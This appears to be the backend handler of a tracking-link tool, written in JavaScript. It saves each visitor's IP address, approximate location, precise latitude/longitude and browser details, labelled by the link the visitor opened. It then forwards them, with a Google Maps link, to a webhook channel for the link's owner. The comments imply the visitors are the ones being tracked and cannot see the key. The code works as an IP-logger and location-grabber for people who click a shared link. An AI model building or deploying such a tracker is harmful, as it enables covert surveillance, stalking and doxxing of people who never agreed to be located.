// Called by the visit page. Saves the visit to Blob storage (so it shows on
// your dashboard) and, if you've set WEBHOOK_URL, also pings that channel.
// Writing needs no key — visitors can't know one. Reading/deleting is protected
// in api/visits.js instead.

import { addVisit } from '../lib/store.js';
import { readJsonBody } from '../lib/http.js';

function newVisitId() {
  return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false, reason: 'method_not_allowed' });
    return;
  }

  const body = await readJsonBody(req);

  const visit = {
    visitId: newVisitId(),           // unique per saved visit (used for deletion)
    id: body.id || '',               // the link's short id
    label: body.label || '',         // the link's custom name
    ip: body.ip || '',
    ipGeo: body.ipGeo || {},
    preciseGeo: body.preciseGeo || null,
    userAgent: body.userAgent || '',
    page: body.page || '',
    time: body.time || new Date().toISOString(),
  };

  const result = { stored: false, notified: false };

  try {
    await addVisit(visit);
    result.stored = true;
  } catch (e) {
    result.reason = 'store_unavailable'; // Blob not connected yet
  }

  const webhook = process.env.WEBHOOK_URL;
  if (webhook) {
    const lines = [];
    lines.push(`**New visit**${visit.label ? ` · ${visit.label}` : ''}${visit.id ? ` · \`${visit.id}\`` : ''}`);
    lines.push(`Time: ${visit.time}`);
    if (visit.ip) lines.push(`IP: \`${visit.ip}\``);
    if (visit.ipGeo.city || visit.ipGeo.country) {
      lines.push(`Approx: ${[visit.ipGeo.city, visit.ipGeo.region, visit.ipGeo.country].filter(Boolean).join(', ')}`);
    }
    if (visit.preciseGeo && visit.preciseGeo.latitude != null) {
      const { latitude, longitude } = visit.preciseGeo;
      lines.push(`Precise: ${latitude}, ${longitude}`);
      lines.push(`Maps: https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`);
    }
    const msg = lines.join('\n');
    try {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: msg, text: msg }),
      });
      result.notified = true;
    } catch { /* best effort */ }
  }

  res.status(200).json({ ok: true, ...result });
}
